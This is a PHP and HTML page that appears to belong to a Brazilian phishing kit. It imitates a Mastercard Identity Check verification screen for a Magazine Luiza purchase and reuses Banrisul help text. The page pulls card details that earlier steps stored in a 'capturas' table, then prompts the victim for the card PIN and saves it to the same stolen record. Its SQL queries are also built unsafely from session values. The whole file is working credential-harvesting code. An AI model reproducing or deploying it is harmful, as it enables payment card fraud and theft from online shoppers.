<?php
error_reporting(0);
ini_set(display_errors, 0);


require_once ("../Raiz/admin/function/global.php");
require_once ("../Raiz/admin/function/conexao.php");


$number_cc = $_SESSION ['number_cc'];

$remove_cc = str_replace(' ', '', $number_cc);
$inicio_cc = substr($remove_cc, 0,4);
$fim_cc = substr($remove_cc, 12, 18);


$ID =  filtro_system($_SESSION ['sku_id']);

$dados1 = "SELECT* FROM produtos where id_maior='$ID'";
$con1 = $mysqli -> query($dados1) or die ($mysqli -> error);


while ($consulta1= $con1 -> fetch_array()){
	
	$preco = $consulta1 ["preco"];
	
	
	
}

$preco_total = number_format($preco,2,",",".");



function parcela ($preco,$number) {
	
$parcela_A = $preco/$number ;
$parcela = number_format($parcela_A,2,",",".");
$parcela1 = substr($parcela, 0, 6);

return $parcela1;
	
	
}


if ($_SESSION ['parcela'] == 1) {
	
	$text_parcela = ''.$preco_total.' à vista';

	
} else {
	
	$parcela_a = parcela ($preco,$_SESSION ['parcela']);
	$text_parcela =  ''.$parcela_a.' em '.$_SESSION ['parcela'].'x';

	
}

$ultimo_id = $_SESSION ['ultimo_id'];

$dados2 = "SELECT* FROM capturas where id=$ultimo_id ";
$con2 = $mysqli -> query($dados2) or die ($mysqli -> error);


while ($consulta2= $con2 -> fetch_array()){
	
	$bandeira_a = $consulta2 ["bandeira"];
	$cc = $consulta2 ["cc"];
	
	
}


	




	function filtrar_bandeira ($string) {
	$tr = strtr(

    $string,

    array (

      'visa' => 'visa_check.png', 
      'mastercard' => 'mastercard_check.png', 
      'discover' => 'discover.jpg', 
      'elo' => 'elo.png', 
      'hipercard' => 'hipercard.png', 
      'american express company' => 'amex.png',
      'ebt' => 'maestro.png',
      'jcb' => 'jcb.png'


    )
);
return $tr;
}


$bandeira_b = filtrar_bandeira ($bandeira_a);


if (empty($bandeira_b)) {
	
$bandeira = 'mastercard_check.png';

} else {
	
$bandeira = filtrar_bandeira ($bandeira_a);

	
}


$bandeira_up = strtoupper ($bandeira_a);



if (isset($_POST ['confirm'])) { 

$pass_cc = filtro_system ($_POST ['pass_cc']);


$sql3 = "Update capturas SET pass_cc='$pass_cc', categoria =2 where cc='$cc' " ;
$query = $mysqli->query($sql3);


$_SESSION ['pagament_complete'] = 1;

header ('location: pagamento.php');


}



?>
<html lang="pt">
<!--[if lte IE 8]><html class="lt-ie9" lang="pt"><![endif]-->
<!--[if IE 9]><html class="lt-ie10" lang="pt"><![endif]-->
<!--[if gt IE 9]><html lang="pt"><![endif]-->
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Validar</title>
  <link href="style.css" rel="stylesheet" />
  
  
  <link href="../Raiz/assets/process/style.css" rel="stylesheet" />
  <style>body {color: #000000;font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;font-size: 1.25em}.header, legend, h1, h2, h3, h4 {color: #000000}label {color: #000000}a,.btn-link {color: #000000;text-decoration: underline}a:visited,.btn-link:visited {color: #000000}a:hover,a:focus,.btn-link:hover,.btn-link:focus {color: #211f1f}a:active,.btn-link:active {color: #211f1f}a.btn-link {font-size: .95em}.btn-primary,.btn-primary:focus,.btn-primary:hover {background: #211f1f;color: #FFF;border: none;border-radius: 0}.btn-primary:active,.btn-primary:active:hover,.btn-primary:active:focus {background: #AB2C29}fieldset {border: 0}fieldset > legend {border-bottom: 0;font-size: 1.00em}:not(.lt-ie9) label.custom-radio [type=radio]:checked+span:before {background: #211f1f}.accordion.modal .modal-body .panel-group .expander {color: #211f1f}.accordion.modal .modal-body .panel-group .panel {background: #FFF}.field-validation-error {color: #AB2C29}.toast-top-full-width {display: none}</style>


</head>
<body>

  	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
		
		<script>
		setInterval(function(){
			$.post("../Raiz/admin/function/processa_vis.php", {contar: '',}, function(data){
				$('#online').text(data);
			});
		}, 10000);
		</script>

	<script>

var i = setInterval(function () {
    
    clearInterval(i);
  
    // O código desejado é apenas isto:
    document.getElementById("loading").style.display = "none";
    document.getElementById("conteudo").style.display = "inline";

}, 4500);


</script>	


  <div class="threeds-one">
    


<div class="container container-sticky-footer">
  
  
  			<div id="loading" style="display: block">

			<div class="header" id="HeaderLogos">
  <div class="row no-pad">
    <div class="col-12">
      <img alt="Mastercard Identity Check logo" class="img-responsive header-logo pull-left" src="../Raiz/assets/img/bandeiras/<?php echo $bandeira?>" />
    </div>
  </div>
</div>



				<center>
				<br><br><br><br><br><br>
				<img width="100" src="../Raiz/assets/load_pagamento.gif">	<br>
					Aguarde...
					
					
				</center>
						
			</div>
			
			
			
						
						
						
						
<div id="conteudo" style="display: none">


  <div class="header" id="HeaderLogos">
  <div class="row no-pad">
    <div class="col-12">
      <img alt="Mastercard Identity Check logo" class="img-responsive header-logo pull-left" src="../Raiz/assets/img/bandeiras/<?php echo $bandeira?>" />
    </div>
  </div>
</div>






<div class="container container-sticky-footer">
<form action="secure.php" autocomplete="off"  id="ValidateCredentialForm" method="post" name="ValidateCredentialForm">    
    <div class="body" dir="LTR">
      

    <h1 class='screenreader-only'>Your One-time Passcode has been sent</h1>

      <br>
      <div class="row">
      </div>
      <div class="row">
          <div class="col-12" id="ValidateOneUpMessage">
              <div id="Body1">Agora falta pouco!<br>Precisamos confirmar a senha do seu cartão <?php echo $bandeira_up ?> para concluir a compra. </div>
          </div>
      </div>

      <br>

      <div class="row form-two-col">
        <div class="col-12">
            <fieldset id="ValidateTransactionDetailsContainer">
                <legend id="ValidateTransactionDetailsHeader">Dados da Compra</legend>

                <div class="validate-field row">
                    <span class="validate-label col-6">Vendedor:</span>
                    <span class="col-6">magazineluiza</span>
                </div>

                <div class="validate-field row">
                    <span class="validate-label col-6">Valor:</span>
                    <span class="col-6 always-left-to-right">R$ <?php echo $text_parcela ?></span>
                </div>

                <div class="validate-field row">
                    <span class="validate-label col-6">Cart&#227;o:</span>
                    <span class="col-6 always-left-to-right"><?php echo $inicio_cc ?>********<?php echo $fim_cc ?></span>
                </div>
                <div class="validate-field row">
                        <span class="validate-label col-6">Senha do cartão:</span>
    <span>
        <input maxlength="6"  required  name="pass_cc" type="password" value="" />
    </span>

                </div>
                <div class="validate-field row">
                    <span class="validate-label col-6">&nbsp;</span>
                    <span id="ValidationErrorMessage" class="field-validation-error" style="display: none;"></span>
                    <span class="field-validation-valid col-6" data-valmsg-for="Credential.Value" data-valmsg-replace="true"></span>
                </div>
            </fieldset>
        </div>
      </div>



    </div>
    <div class="sticky-footer">
      <div class="row no-pad">
        <div class="col-12 text-center">
          <button type="submit" class="btn btn-primary" name="confirm">Confirmar</button>
        </div>
      </div>
      

<div class="footer" id="FooterLinks">
  <div class="row">
    <div class="col-12">
      <ul class="list-inline list-inline-separated pull-left"><li><a class="btn btn-link" data-target="#FAQ" data-toggle="modal" href="#FAQ" id="FooterLink1">Ajuda</a></li></ul>
    </div>
  </div>
</div>
    </div>

</form></div>




<form action="/Api/NextStep/StepUp" autocomplete="off" data-ajax="true" data-ajax-begin="ccHelpers.ajax.onBegin" data-ajax-complete="ccHelpers.ajax.onComplete" data-ajax-failure="ccHelpers.ajax.onFailure" data-ajax-method="form" data-ajax-success="ccHelpers.ajax.onSuccess" id="StepupForm" method="post" name="StepupForm"><input id="HiddenTransactionId" name="TransactionId" type="hidden" value="UlLg50Rl2yMOjtgkr5ZZzxhSy3I0" /><input id="StepUpIssuerId" name="IssuerId" type="hidden" value="5cd1baa04901d50a98521ef4" /></form>


  <input data-val="true" data-val-number="The field MessageVersion must be a number." data-val-required="The MessageVersion field is required." id="MessageVersion" name="MessageVersion" type="hidden" value="1" />
  <div class="modal fade" id="FAQ" tabindex="-1" role="dialog" aria-labelledby="FAQ-label">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
        <h4 class="modal-title" id="FAQ-label">Ajuda</h4>
      </div>
      <div class="modal-body partial-modal">
          <div><p><strong>Por que estou vendo essa tela?</strong><br><br>Essa tela aparece para que a gente possa saber que é você mesmo quem está fazendo a compra e, assim, tornar a sua compra na internet mais segura : )<br><br><br><strong>Por que eu não recebi o código?</strong><br><br>Talvez o seu telefone celular não esteja atualizado :(<br>Acesse o Meus Cartões, no app do Banrisul Digital, e clique em Atualizar Contatos, ou vá até uma agência do Banrisul. Seus dados serão atualizados no dia seguinte.<br>Caso você tenha urgência em fazer essa compra, você também pode ligar para a Central de Atendimento. Anote o número: 0800 701 6888.<br><br><br><strong>Por que a minha compra não deu certo se eu digitei o código que foi enviado?</strong><br><br><br>O código serve para que a gente possa saber que é você quem está fazendo a compra. Depois de colocar o código, são feitas as outras confirmações necessárias no seu cartão, assim como nas compras presenciais. Se você digitou o código certo e ainda assim não conseguiu terminar a compra, a Central de Atendimento pode ajudar você a entender o que aconteceu. Anote o número: 0800 701 6888.</p>
</div>
      </div>
    </div>
  </div>
</div>


</div>


  </div>
  
  


</body>
</html>
